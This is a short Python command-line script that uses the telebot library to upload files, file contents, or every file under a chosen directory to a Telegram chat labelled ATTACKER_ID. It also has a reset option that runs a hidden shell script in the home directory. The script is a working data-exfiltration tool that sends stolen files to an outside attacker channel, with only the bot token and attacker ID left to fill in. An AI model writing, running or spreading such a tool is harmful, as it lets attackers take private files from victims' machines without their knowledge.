import os
import sys
import telebot

# YOU CAN change modify 
# BOT_TOKEN = 'change'
# GROUP_CHAT_ID = 'change'
# INSTALL PYTHON AND TELEBOT

BOT_TOKEN = 'MODIFY'

ATTACKER_ID = 'MODIFY'

bot = telebot.TeleBot(BOT_TOKEN)

def send_message(message):
    bot.send_message(ATTACKER_ID, message)

def upload_file(file_path, as_text=False):
    try:
        if as_text:
            with open(file_path, 'r') as f:
                text = f.read()
            bot.send_message(ATTACKER_ID, text)
        else:
            file_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                bot.send_document(ATTACKER_ID, f, caption=f'File "{file_name}" uploaded successfully!')
    except Exception as e:
        send_message(f'Error uploading file: {str(e)}')

def share_all_files(directory):
    try:
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                upload_file(file_path)
        send_message("All files uploaded successfully!")
    except Exception as e:
        send_message(f'Error sharing files: {str(e)}')

def reset_config():
    try:
        os.system("$HOME/.sharepyfx/reset.sh")
    except Exception as e:
        send_message(f'Error resetting configuration: {str(e)}')

def print_help():
    print("Usage: python sharefx.py <option> <argument>")
    print("-h : Print this help message")
    print("-a <directory> : Share all files from the specified directory")
    print("-c <file_path> : Share the content of the specified file as text")
    print("-f <file_path> : Share the specified file")
    print("-r : Reset configuration")

if len(sys.argv) < 2:
    print("Error: No option provided.")
    print_help()
    sys.exit(1)

option = sys.argv[1]

if option == "-h":
    print_help()
    sys.exit(0)
elif option == "-a":
    if len(sys.argv) != 3:
        print("Error: Missing directory argument.")
        print_help()
        sys.exit(1)
    directory = sys.argv[2]
    if not os.path.isdir(directory):
        print(f"Error: '{directory}' is not a valid directory.")
        sys.exit(1)
    share_all_files(directory)
elif option == "-c":
    if len(sys.argv) != 3:
        print("Error: Missing file argument.")
        print_help()
        sys.exit(1)
    file_path = sys.argv[2]
    if not os.path.isfile(file_path):
        print(f"Error: '{file_path}' is not a valid file.")
        sys.exit(1)
    upload_file(file_path, as_text=True)
elif option == "-f":
    if len(sys.argv) != 3:
        print("Error: Missing file argument.")
        print_help()
        sys.exit(1)
    file_path = sys.argv[2]
    if not os.path.isfile(file_path):
        print(f"Error: '{file_path}' is not a valid file.")
        sys.exit(1)
    upload_file(file_path)
elif option == "-r":
    reset_config()
else:
    print("Error: Invalid option.")
    print_help()
    sys.exit(1)
